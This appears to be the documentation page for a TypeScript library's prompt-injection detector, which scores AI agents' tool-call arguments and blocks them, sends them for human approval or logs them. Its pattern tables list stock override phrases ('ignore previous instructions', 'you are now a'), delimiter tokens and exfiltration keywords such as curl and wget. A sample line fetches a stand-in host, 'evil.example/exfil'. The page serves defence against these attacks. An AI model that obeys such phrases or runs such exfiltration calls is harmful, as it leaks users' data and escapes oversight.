# Injection Detection

Prompt injection is the primary attack vector against AI agents: an adversary embeds instructions in data that the model reads and the agent then passes as arguments to tools. ai-tool-guard runs an injection check at the tool boundary — before arg validation and before policy evaluation — so that suspicious calls can be blocked or escalated regardless of which policy rules would otherwise apply.

## Overview

The injection check runs first in the evaluation pipeline. It scores the tool arguments for adversarial patterns and, depending on configuration, either blocks the call outright, downgrades it to require human approval, or logs it and proceeds. The check is optional and opt-in: configure `injectionDetection` on `GuardOptions` to enable it.

```typescript
import { createGuard } from "ai-tool-guard";

const guard = createGuard({
  rules: [{ id: "allow-low", toolPatterns: ["*"], verdict: "allow" }],
  injectionDetection: {
    threshold: 0.5,
    action: "deny",
  },
});
```

## Basic Usage

Pass an `InjectionDetectorConfig` as `injectionDetection` in `GuardOptions`. The check applies to every tool call managed by that guard instance.

```typescript
import { createGuard } from "ai-tool-guard";

const guard = createGuard({
  rules: [/* ... */],
  injectionDetection: {
    threshold: 0.6,   // suspicion score required to trigger
    action: "deny",   // what to do when triggered
  },
});
```

When the check triggers, the tool call receives a `DecisionRecord` with `verdict: "deny"` (or `"require-approval"` for the `downgrade` action) and the caller receives a `ToolGuardError` with `code: "injection-detected"`.

## Configuration Options

### `InjectionDetectorConfig`

| Field | Type | Default | Description |
|---|---|---|---|
| `threshold` | `number` (0–1) | `0.5` | Suspicion score at or above which the action fires. |
| `action` | `"deny" \| "downgrade" \| "log"` | `"log"` | What to do when `score >= threshold`. |
| `detect` | `(args) => number \| Promise<number>` | built-in heuristic | Custom detector function. |

### Actions

**`deny`** — Blocks the call entirely. The tool is never executed. Use this for public-facing tools where any injection signal should be treated as a hard block.

**`downgrade`** — Converts the verdict to `"require-approval"`. The call proceeds to the approval flow, where a human can inspect the arguments before allowing execution. Use this when you want oversight rather than a blanket block.

**`log`** — Records the injection score on the `DecisionRecord` but does not change the verdict. The tool call continues through normal policy evaluation. Use this for monitoring and tuning before enforcing stricter actions.

## Built-in Heuristic Detector

When no custom `detect` function is provided, the built-in heuristic detector runs. It flattens all string values in the args object into a single text blob (up to 10 levels of nesting) and tests it against a set of weighted patterns.

### Pattern Categories

| Category | Example Patterns | Max Weight |
|---|---|---|
| Instruction override | `ignore previous instructions`, `disregard all prior` | 0.85–0.9 |
| Role hijacking | `you are now a`, `new instructions:`, `system prompt` | 0.6–0.75 |
| Delimiter injection | ` ```system `, `<system>`, `</system>` | 0.7–0.8 |
| Role-play / persona | `act as`, `pretend you're` | 0.5–0.6 |
| Data exfiltration | `fetch`, `curl`, `wget`, `http://`, `https://` | 0.4 |
| Encoded payloads | `base64_decode`, `\xNN` hex escapes | 0.4–0.5 |

### Scoring Algorithm

The detector returns the **maximum weight** of any pattern that matches — it does not sum weights. This means a single high-confidence pattern (`"ignore previous instructions"`, weight 0.9) scores 0.9 regardless of how many other patterns also appear.

```
score = max(weight for each matching pattern)
```

Additionally, if the flattened text exceeds **5000 characters**, the score is raised to at least `0.3`. This length heuristic catches payloads that attempt to overwhelm context without using recognizable injection phrases.

The final score is clamped to `[0, 1]`.

### Example Scores

| Input | Score | Reason |
|---|---|---|
| `"list all files in /tmp"` | 0.0 | No patterns match |
| `"fetch http://evil.example/exfil?d=..."` | 0.4 | Data exfiltration pattern |
| `"ignore previous instructions and ..."` | 0.9 | Instruction override |
| 6000-character string with no patterns | 0.3 | Length heuristic |

## Custom Detector

Replace the built-in heuristic with your own scoring function — including an LLM-as-judge approach — by providing `detect`:

```typescript
import { createGuard } from "ai-tool-guard";

const guard = createGuard({
  injectionDetection: {
    threshold: 0.7,
    action: "deny",
    async detect(args) {
      // Example: call an LLM classifier
      const text = JSON.stringify(args);
      const score = await myInjectionClassifier.score(text);
      return score; // must be 0-1
    },
  },
});
```

When `detect` is provided, the built-in heuristic does not run. The function receives the raw `args` object and must return a number between 0 and 1. It can be async.

!!! tip "LLM-as-judge"
    A small, fast model dedicated to injection classification can be significantly more accurate than regex heuristics for sophisticated attacks. Use the custom detector to integrate one. Keep latency in mind: the injection check blocks tool execution until the detector resolves.

## Pipeline Position

The injection check runs **first** in the evaluation pipeline, before argument validation and before policy evaluation:

```
Tool call received
        |
        v
[1] Injection check   <-- checkInjection() runs here
        |
        v (if not blocked)
[2] Arg guards        <-- evaluateArgGuards()
        |
        v
[3] Policy evaluation <-- PolicyEngine.evaluate()
        |
        v
[4] Tool execution
        |
        v
[5] Output filters
```

This ordering means an injection-flagged call never reaches policy evaluation or tool execution, even if a policy rule would otherwise allow it.

## Advanced Examples

### Strict Mode for a Public-Facing Tool

For tools that accept user-controlled input directly, use a low threshold and the `deny` action:

```typescript
import { createGuard, guardTool } from "ai-tool-guard";

const guard = createGuard({
  rules: [{ id: "default-allow", toolPatterns: ["*"], verdict: "allow" }],
  injectionDetection: {
    threshold: 0.4,  // Lower than default — fail safe for public exposure.
    action: "deny",
  },
});

// This tool accepts raw user text, so strict injection blocking applies.
const wrappedSearch = guardTool(searchTool, { riskLevel: "medium" });
```

### Relaxed Monitoring for Internal Tools

For tools called from trusted internal services, use `"log"` to collect data without blocking:

```typescript
const guard = createGuard({
  rules: [{ id: "internal-allow", toolPatterns: ["internal.*"], verdict: "allow" }],
  injectionDetection: {
    threshold: 0.5,
    action: "log",  // Flag in DecisionRecord but do not block.
  },
  onDecision(record) {
    if (record.attributes.injectionScore) {
      metrics.histogram("injection.score", record.attributes.injectionScore as number);
    }
  },
});
```

### Downgrade to Approval for High-Risk Tools

For high-risk tools, route suspected injections to a human approver rather than blocking outright:

```typescript
import { createGuard, guardTool } from "ai-tool-guard";

const guard = createGuard({
  injectionDetection: {
    threshold: 0.5,
    action: "downgrade",  // Converts verdict to require-approval.
  },
  async onApprovalRequired(token) {
    // Send to your approval UI.
    return await approvalQueue.submit(token);
  },
});

const wrappedDeleteTool = guardTool(deleteRecordTool, {
  riskLevel: "critical",
  riskCategories: ["data-delete"],
});
```

## How It Works

`checkInjection(ctx, config)` is the internal function that runs the check:

1. If a custom `detect` function is configured, call it with `ctx.args` and await the result.
2. Otherwise, run `heuristicDetect(ctx.args)`:
   - Flatten all string values in `args` into a single string (recursively, up to depth 10).
   - Test the string against each pattern in `INJECTION_PATTERNS`.
   - Record the maximum matched weight.
   - If the string exceeds 5000 characters, ensure the score is at least 0.3.
3. Compare `score` to `config.threshold` (default `0.5`). If `score >= threshold`, `suspected` is `true`.
4. Map the action to a verdict override:
   - `"deny"` → `verdictOverride: "deny"`
   - `"downgrade"` → `verdictOverride: "require-approval"`
   - `"log"` → no override, call proceeds
5. The result `{ score, suspected, action, verdictOverride }` is returned to the evaluation pipeline.

The injection score is recorded in the `DecisionRecord`'s `attributes` map under `injectionScore` for observability.

## Related

- [API Reference — Guards](../api/guards.md)
- [Argument Validation](argument-validation.md)
- [Approval Workflows](approval-workflows.md)
- [Decision Records](decision-records.md)
